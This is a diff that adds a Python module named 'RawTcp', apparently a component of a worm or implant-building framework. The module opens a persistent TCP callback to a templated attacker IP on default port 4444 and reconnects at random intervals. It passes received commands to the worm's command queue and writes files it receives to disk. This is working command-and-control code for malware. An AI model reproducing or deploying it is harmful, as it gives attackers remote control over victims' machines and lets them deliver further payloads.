@@ -1,0 +1,133 @@
+#!name##RawTcp
+#!types##module
+#!info##[PyS] Basic TCP socket communication. Does not send or receive files. Handles sending and receiving messages and commands.
+#!reqVar##IP_ADDR##Host address.##str
+#!reqVar##RT_port##Host port number##int
+#!setVar##RT_port##4444##int
+#!reqVar##RT_format_code##Message encoding format.##str
+#!setVar##RT_format_code##utf-8##str
+#!TAGS##[PyS]
+
+
+import socket
+import threading
+from time import sleep
+from typing import Union
+from random import randint
+
+
+class RawTcp:
+    MTYPES = "conn"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.addr = ("{{IP_ADDR}}", {{RT_port}})
+        self.format = "{{RT_format_code}}"
+        self.is_conn = False
+        self._try_conn = False
+        self._conn_th = None
+
+        
+        self.raw_len = 1024
+        self.in_cmd = self.worm.in_cmd
+        
+
+    def _connect(self) -> bool:
+        self.is_conn = False
+        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            self.client.connect(self.addr)
+            self.is_conn = True
+            return True
+        except:
+            return False
+
+    def _conn(self) -> None:
+        while self.worm.working:
+            if self._connect():
+                self.client.settimeout(3)
+                self._recive()
+            sleep(randint(2, 6))
+        
+    
+    def _recive(self) -> None:
+        msg = b""
+        while self.is_conn:
+            try:
+                recv = self.client.recv(self.raw_len)
+            except TimeoutError:
+                continue
+            except:
+                break
+            if recv:
+                if len(recv) < self.raw_len:
+                    msg += recv
+                    self.in_cmd.put(msg.decode(self.format))
+                    msg = b""
+                else:
+                    msg += recv
+            else:
+                break
+        try:
+            self.client.close()
+        except:
+            pass
+        self.is_conn = False
+    
+    def recive_file(self) -> None:
+        data = b""
+        while self.is_conn:
+            try:
+                recv = self.client.recv(self.raw_len)
+            except:
+                return
+            if not recv:
+                return
+            else:
+                if len(recv) < self.raw_len:
+                    data += recv
+                else:
+                    data += recv
+                    break
+        try:
+            with open("./myfile", "wb") as file:
+                file.write(data)
+        except:
+            return
+        self.send_msg("File downloaded")
+
+    def exec_cmd(self, cmd: list) -> None:
+        match cmd[0]:
+            case "RTclose":
+                self.is_conn = False
+    
+    def help(self) -> str:
+        h = "'RTclose' - Close module connection\n"
+        return h
+
+    def connect(self) -> None:
+        if not self._try_conn:
+            self._try_conn = True
+            self._conn_th = threading.Thread(target=self._conn, daemon=True)
+            self._conn_th.start()
+    
+    def _send_msg(self, msg: str) -> None:
+        if not self.is_conn:
+            return
+        try:
+            self.client.send(msg.encode(self.format))
+        except:
+            pass
+    
+    def send_msg(self, msg: str) -> None:
+        self._send_msg(msg)
+    
+    def send_data(self, data) -> None:
+        self._send_msg(str(data))
+    
+    def Run(self) -> None:
+        self.connect()
+    
+    def start(self) -> None:
+        self.Run()
+    
+
